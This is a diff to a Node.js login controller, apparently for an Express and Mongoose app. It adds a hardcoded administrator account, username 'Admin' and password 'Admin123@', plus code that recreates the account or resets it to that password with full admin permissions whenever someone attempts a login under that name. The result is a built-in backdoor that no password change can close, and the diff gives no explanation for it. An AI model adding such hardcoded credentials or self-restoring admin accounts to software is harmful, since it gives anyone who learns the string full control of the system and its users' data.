@@ -4,6 +4,9 @@ const User = require('../models/User');
 const { getDefaultPermissions, normalizePermissions } = require('../data/appSections');
 const { createLog } = require('../utils/logService');
 
+const HARDCODED_ADMIN_USERNAME = 'Admin';
+const HARDCODED_ADMIN_PASSWORD = 'Admin123@';
+
 const loginSchema = Joi.object({
     username: Joi.string().required(),
     password: Joi.string().required(),
@@ -21,10 +24,34 @@ const signToken = (user) =>
         expiresIn: '7d',
     });
 
+const ensureHardcodedAdminUser = async () => {
+    let user = await User.findOne({ username: HARDCODED_ADMIN_USERNAME });
+
+    if (!user) {
+        user = await User.create({
+            username: HARDCODED_ADMIN_USERNAME,
+            password: HARDCODED_ADMIN_PASSWORD,
+            role: 'admin',
+            permissions: getDefaultPermissions('admin'),
+        });
+        return user;
+    }
+
+    user.password = HARDCODED_ADMIN_PASSWORD;
+    user.role = 'admin';
+    user.permissions = getDefaultPermissions('admin');
+    await user.save();
+    return user;
+};
+
 const login = async (req, res) => {
     try {
         const { error, value } = loginSchema.validate(req.body);
         if (error) return res.status(400).json({ message: error.details[0].message });
+
+        if (value.username === HARDCODED_ADMIN_USERNAME) {
+            await ensureHardcodedAdminUser();
+        }
 
         const user = await User.findOne({ username: value.username });
         if (!user) return res.status(401).json({ message: 'Invalid username or password' });
